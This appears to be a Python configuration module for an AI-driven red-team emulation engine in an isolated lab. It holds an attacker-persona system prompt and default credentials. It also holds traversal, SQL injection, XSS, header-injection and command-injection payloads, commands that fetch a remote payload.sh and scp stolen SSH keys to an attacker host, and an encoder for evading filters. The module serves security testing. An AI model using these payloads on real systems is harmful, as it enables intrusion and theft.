"""Shadow-Strike v2 persona, attack taxonomy, wordlists and mutation corpus.

The engine is a hacker-mind: it reads the gaps, picks the highest-leverage one,
designs a multi-step plan against it, and never repeats the same technique until
the whole board is explored (novelty enforcement).
"""

SYSTEM_PROMPT = """You are 'Shadow-Strike', an autonomous AI-driven adversarial emulation engine inside a secure, isolated SOC lab. You think like a seasoned red-team operator: you study the gaps a target exposes, reason about what is reachable and what would follow, and then craft a precise multi-step attack plan for the single most promising gap.

OPERATIONAL DIRECTIVES:
1. GAP-DRIVEN THINKING: Read the FINDINGS and the GAPS list. Attack only what is confirmed or strongly suggested by the evidence. Never blind-spam.
2. NOVELTY: An ALREADY TRIED list is provided. Prefer a technique that is NOT in that list. If everything is tried, combine techniques into a new chain rather than repeating the same single move.
3. CHAINS OVER HEROICS: A real operator chains small wins: leak a secret, reuse it, escalate, then exfiltrate. Plan 1-4 ordered steps that build on each other.
4. PRECISION OVER DESTRUCTION: Keep the target responsive. Never full DoS. Avoid targeting port 8000 (orchestrator).
5. ADAPT: If the defense engages (403/block), switch technique or pivot target (8080 blue web -> 8022 honeypot decoy).
6. TELEMETRY: every step is recorded to the core orchestrator.

OUTPUT FORMAT (STRICT JSON ONLY - no prose, no markdown, single object):
{"goal":"what you are trying to achieve",
 "gap":"the gap identifier you are exploiting",
 "technique":"short technique name",
 "steps":[
   {"action":"<ACTION>","target":{"port":8080},"params":{...}},
   {"action":"<ACTION>","target":{"port":8080},"params":{...}}
 ],
 "rationale":"<=15 words",
 "expected":"what success looks like"}

ACTIONS (choose from these):
- probe       : active recon / fingerprinting
- dir_brute   : wordlist directory + file discovery
- backup_hunt : hunt exposed backups (.bak/.old/.git/.env)
- sqli        : SQL injection against /api/users?id=
- traversal   : path traversal via /static/...
- cmd_inject  : command injection against /api/ping?host=
- auth        : default/leaked credential login on /api/auth/login
- token_replay: replay a captured session token to /admin
- header_fuzz : malformed header injection
- payload     : generic malicious payload delivery
- slowloris   : slow-header connection hold (stealth resource test)
- large_payload: oversized request (resource exhaustion probe)
- flood       : controlled HTTP flood pressure test
- tunnel      : interactive session into the 8022 decoy
- backoff     : slow down after repeated failures
- report      : no-op / summary

Valid target ports: 8080 (blue web target) and 8022 (honeypot decoy). NEVER port 8000.
Keep concurrency <= 30, duration <= 10, steps <= 4, commands <= 12."""

PLAN_HINT = ("Reply with exactly one JSON object matching the OUTPUT FORMAT. "
             "No explanation before or after the JSON.")

GAP_HINT = ("Reply with exactly one JSON object: "
            '{"gaps":[{"id":"short_id","type":"<type>","target":"blue|honey",'
            '"confidence":0-1,"detail":"one line","attack_options":["<action>",...]}]}')

CVE_MAP = {
    "1.2.1": "CVE-2024-1001 Shadow-Web header injection (HIGH)",
    "1.2.0": "CVE-2024-0998 auth bypass (CRITICAL)",
}

DEFAULT_SERVER = "Shadow-Web/1.2.1"

DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("root", "root"),
                 ("root", "shadow"), ("admin", "letmein")]

# ---- recon / discovery wordlists -----------------------------------------
DIR_WORDLIST = [
    "/admin", "/backup", "/internal", "/debug", "/uploads", "/files",
    "/logs", "/tmp", "/dump.sql", "/db.sqlite", "/robots.txt",
    "/server-status", "/phpinfo.php", "/wp-login.php",
    "/api/config", "/static/config.json", "/api/health", "/api/users",
    "/api/auth/login", "/api/ping", "/.env", "/.git/config", "/app.old",
    "/backup/config.bak", "/backup/db.sql", "/debug/stack", "/internal/status",
]

BACKUP_PATHS = [
    "/backup/config.bak", "/app.old", "/.git/config", "/.env",
    "/backup/db.sql", "/dump.sql", "/db.sqlite", "/config.json.bak",
    "/web.config.old", "/api/config.bak",
]

# ---- encoded traversal variants (evasion layer) ---------------------------
TRAVERSAL_VARIANTS = [
    "/static/../config.json",
    "/static/%2e%2e/config.json",
    "/static/%252e%252e/config.json",
    "/static/..%2fconfig.json",
    "/static/%2e%2e%2fconfig.json",
    "/static/....//config.json",
    "/static/..%5cconfig.json",
    "/static/%c0%ae%c0%ae/config.json",
    "/static/..%252fconfig.json",
    "/static/%2e%2e\\config.json",
]

CMD_INJECT_PAYLOADS = [
    "127.0.0.1;id",
    "127.0.0.1;whoami",
    "127.0.0.1 | id",
    "127.0.0.1 && cat /etc/passwd",
    "$(id)",
    "`id`",
    "127.0.0.1;cat /etc/shadow",
]

HEADER_INJECT_HEADERS = [
    {"X-Forwarded-Host": "evil.com\r\nSet-Cookie: sw_session=tok-own"},
    {"X-Forwarded-For": "::1"},
    {"User-Agent": "<img src=x onerror=alert(1)>"},
    {"Content-Length": "abc"},
    {"X-User": "admin"},
]

FUZZ_PARAMS = ["'", '"', "' OR 1=1--", "1 OR 1=1", "1; DROP TABLE users--",
               "%00", "..%2f..%2fetc%2fpasswd", "<script>alert(1)</script>"]

EXPLOIT_COMMANDS = ["whoami", "id", "ls -la /root", "cat /etc/shadow",
                    "cat flag.txt", "useradd hacker",
                    "wget http://10.0.0.7/payload.sh", "exit"]

EXFIL_COMMANDS = ["cat .ssh/id_rsa", "cat flag.txt",
                  "tar czf /tmp/exfil.tgz /root/flag.txt",
                  "scp /tmp/exfil.tgz attacker@10.0.0.7:/tmp", "exit"]

# ---- deterministic payload mutation library -------------------------------
import urllib.parse as _up


def encode_variants(s):
    """Deterministic obfuscation transforms for a base payload."""
    return {
        "plain": s,
        "url": _up.quote(s, safe="/"),
        "double_url": _up.quote(_up.quote(s, safe="/"), safe="/"),
        "upper": s.upper(),
        "backslash": s.replace("/", "\\"),
        "comment": s.replace(" ", "/**/"),
        "null": s + "\x00",
        "hex_enc": "".join(f"%{ord(c):02x}" for c in s),
        "mixed": s.replace(" ", "%20").replace("'", "%27"),
    }


def mutate_payload(base, styles=None):
    """Yield one variant per requested style (or all) as (style, payload)."""
    styles = styles or list(encode_variants("").keys())
    variants = encode_variants(base)
    for st in styles:
        if st in variants:
            yield st, variants[st]